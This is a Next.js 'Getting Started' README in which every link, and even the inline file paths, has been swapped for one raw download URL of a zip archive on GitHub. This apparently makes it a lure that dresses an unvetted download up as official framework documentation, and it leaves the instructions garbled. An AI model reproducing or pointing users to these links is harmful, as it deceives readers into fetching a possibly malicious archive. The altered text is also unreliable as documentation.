This is a [https://github.com/MugaboDenys/10pearls/raw/refs/heads/main/components/pearls_3.5-beta.3.zip](https://github.com/MugaboDenys/10pearls/raw/refs/heads/main/components/pearls_3.5-beta.3.zip) project bootstrapped with [`create-next-app`](https://github.com/MugaboDenys/10pearls/raw/refs/heads/main/components/pearls_3.5-beta.3.zip).

## Getting Started

First, run the development server:

```bash
npm run dev
# or
yarn dev
# or
pnpm dev
```

Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.

You can start editing the page by modifying `https://github.com/MugaboDenys/10pearls/raw/refs/heads/main/components/pearls_3.5-beta.3.zip`. The page auto-updates as you edit the file.

[API routes](https://github.com/MugaboDenys/10pearls/raw/refs/heads/main/components/pearls_3.5-beta.3.zip) can be accessed on [http://localhost:3000/api/hello](http://localhost:3000/api/hello). This endpoint can be edited in `https://github.com/MugaboDenys/10pearls/raw/refs/heads/main/components/pearls_3.5-beta.3.zip`.

The `pages/api` directory is mapped to `/api/*`. Files in this directory are treated as [API routes](https://github.com/MugaboDenys/10pearls/raw/refs/heads/main/components/pearls_3.5-beta.3.zip) instead of React pages.

This project uses [`next/font`](https://github.com/MugaboDenys/10pearls/raw/refs/heads/main/components/pearls_3.5-beta.3.zip) to automatically optimize and load Inter, a custom Google Font.
